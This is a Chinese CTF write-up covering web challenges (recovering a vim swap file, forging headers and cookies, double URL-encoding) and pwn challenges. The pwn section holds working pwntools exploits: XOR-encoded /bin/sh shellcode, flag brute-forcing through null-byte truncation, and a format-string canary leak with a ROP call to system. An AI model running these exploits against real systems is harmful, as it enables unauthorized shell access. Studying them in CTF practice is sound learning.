## web
### 谁吃了我的flag
给了提示 vim ，于是想到 .swp 备份文件
访问：
    http://118.25.111.31:10086/.index.html.swp
下载到备份文件后，直接用 notepad++ 打开，划到最后就可以看到 flag
也可以用 vim 命令恢复出源文件再提交 flag
    vim -r .index.html.swp
### 换头大作战
根据题目名字猜想可能是该写 HTTP 头来绕过一些限制或者满足一些条件。
  1. 第一步要求用 POST 方法提交
  1. 第二步是改 XXF 头，这里用 bp 改了，127.0.0.1
  1. 第三步改 UA，这里需要多试几次
    Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Waterfox/50.0
  1. 第四步 the requests should referer from www.bilibili.com
即加上 Referer 字段，值为 www.bilibili.com
  * 注意这里不需要 http/https
  * 最后一步伪造 cookie，admin = 1 即可
* * *
### very easy web
简单的代码审计题目
    干巴爹");
    $_GET['id'] = urldecode($_GET['id']);
    if($_GET['id'] === "vidar")
    {
      echo $flag;
    }
    highlight_file(__FILE__);
    ?>
仔细看题目，没有办法直接从 strpos 函数的使用不当下手  
参考：
也没有办法从弱类型下手，因为这里是 !==、=== ，而不是 !=、==
看到后面有一个 urldecode 函数，所以构造下 "vidar" 的 url 编码
    http://120.78.184.111:8080/week1/very_ez/index.php?id=%76%69%64%61%72
但是会发现没用的， **原因是在你输入的时候，浏览器帮你的 url 先解码了一遍** 。所以后面的 urldecode 函数就没用上，所以这里需要二次
urlencode。
    http://120.78.184.111:8080/week1/very_ez/index.php?=%25%37%36%25%36%39%25%36%34%25%36%31%25%37%32
### can u find me?
右键源代码发现 f12.php，访问提示需要 POST 一个 password 字段
在返回包头里有 password 的值，给他提交上
提交后访问 iamflag.php 得到 flag
## pwn
### babysc
checksec 查看保护，保护全无，可以直接往栈上填充数据
这题没办法用 IDA 直接 f5 ，只能在 IDA 或者 gdb 动态调试一步步跟
程序大概的逻辑是先调用 read 函数接受 0x50 的输入，再 **将输入的逐个字节与1、2、3...进行异或** 。
最后会调用 call rdx，rdx 的位置来自 buf ，rax 作为指针在 buf 中赋值 [rbp+rax+buf]，
**所以这里就需要我们输入填充异或后的 shellcode 到 buf 中**
在这里找一个 shellcode 的十六进制编码
用脚本对 shellcode 进行逐个异或，然后 send 即可
    from pwn import *
    #p = process('babysc')
    p = remote('118.24.3.214',10000)
    a = "\x48\x31\xc9\x48\xf7\xe1\x04\x3b\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
    b = ""
    for i in range(1,len(a)+1):
            b+=chr(i^ord(a[i-1]))
    pause()
    p.sendline(b)
    p.interactive()
### aaaaaaaaaa
丢 IDA，在 main 函数中 f5，逻辑很简单：  
需要你只能输入 a ，只要你输入的 a 的数量大于 99，就 break 出 while 循环，执行到后面的 system 函数。
本地测试直接 getshell，远程也是一样的， nc 连上 getshell
### 薯片拯救世界1
IDA 打开 main 函数，程序的逻辑很简单，先打开服务器下的 flag ，输出内容到 buf 缓冲区中，接着接受输入，如果输入的和 buf
的内容相等就会输出正确的信息。
问题出在 strlen 和 strncmp 函数的配合使用，因为 strlen 函数是以 \x00 截断的，如果我们手动输入的字符串后面加上 \x00
的话，就会满足 strncmp 函数的判断
  * **例如，这里我们填入 "hg\x00"，strlen 就会但会 2，strncmp 的第三个参数为 2，比较的是 "hg" 和 flag 的前两个字符串，就会满足判断。**
所以我们可以一步步的爆破出 flag。注意在爆破成功一位出来时，需要重新连接远程服务器
#### 利用脚本
脚本写的还是存在一些问题，但是可以出结果就行了。最后手动加上 "}"
    from pwn import *
    def init():
            p = remote('118.24.3.214',10001)
            for i in range(10):
                    p.sendline('1')
                    if '......' in p.recvline():
                            break
                    p.recvline()
            p.recvline()
            return p
    flaggggggg = "hga"
    for x in range(33):
            p = init()
            for i in range(10,255):
                    p.send(flaggggggg + chr(i) +'\x00')
                    res = p.recvline()
                    info(res)
                    if '......' not in res:
                            success(chr(i))
                            flaggggggg += chr(i)
                            success('flag is : %s'%flaggggggg)
                            break
                    p.recvline()
    p.interactive()
    hgame{Ch1p_1s_Awakking!}
### Steins;Gate
这题利用起来还是挺麻烦的。checksec 检查有 canary 保护。
IDA 打开 main 函数，发现有五个函数，第二个和第五个一样
并且在左边的函数列表中发现有 system 函数。
    __int64 __fastcall main(__int64 a1, char **a2, char **a3)
    {
      sub_400AF1();
      sub_400A91(sub_4008F6);
      sub_400A91(sub_400958);
      sub_400A91(sub_400A00);
      sub_400A91(sub_4008F6);
      return 0LL;
    }
第一个函数中初始化操作，读取一个随机数，接受一个输入到 bss 段，这里我们先填入 "/bin/sh"， **方便后面调用 system 函数**
  1. 第二个函数是一个栈溢出，只要满足 v2 = 0x33就行
直接构造
    'a' * 0x30 + '\x33\x23'
  1. 第三个函数是一个格式化字符串和栈溢出，我们通过格式化读取出 v0 的值，再通过计算溢出覆盖 v4 的指
gdb 本地调试可以看到 v0 的值就在输入的格式化字符串的边上，也就是输入 "%7$p"（ **64 位的程序是从 7 偏移开始才能读出栈的数据的**
，不注意的话这是个坑点）
  1. 第四个函数只有格式化字符串，而且要满足 v1 = 0x6666， **这里的格式化字符串其实是让你读取 canary 的，v1 的值只能通过上一个函数的溢出来修改**
    f"*0x1c + p32(0x6666) + "f" * 0x10 +p32(v4)
  1. 泄露出 canary 之后，最后一步函数溢出的再结合 rop 就可以调用 system 函数来 getshell
最后的利用脚本：
    from pwn import *
    #context.log_level = "debug"
    p = remote('118.24.3.214', 10002)
    p.recvuntil("ID:")
    d = 0x602040
    p.sendline("/bin/sh\x00")
    p.recvuntil("world.\n")
    payload = "f"*0x30
    payload += "\x33\x23"
    p.send(payload)
    p.recvuntil("man.\n")
    p.send("%7$p")
    i = int(p.recv(numb=10),16) + 0x1234
    p.recvuntil("it?\n")
    p.send("f"*0x1c + p32(0x6666) + "f" * 0x10 +p32(i))
    p.recvuntil("debts.\n")
    p.send("%11$p")
    canary = int(p.recv(numb=18),16)
    success("canary ===> " + hex(canary))
    p.recvuntil("world.\n")
    payload = 0x30 * "a"
    payload += "\x33\x23"
    payload = payload.ljust(0x38,"\x00")
    payload += p64(canary)
    payload += p64(0x00)
    payload += p64(0x400c73)
    payload += p64(d)
    payload += p64(0x400A89)
    p.send(payload)
    p.interactive()
## MISC
### Hidden Image in LSB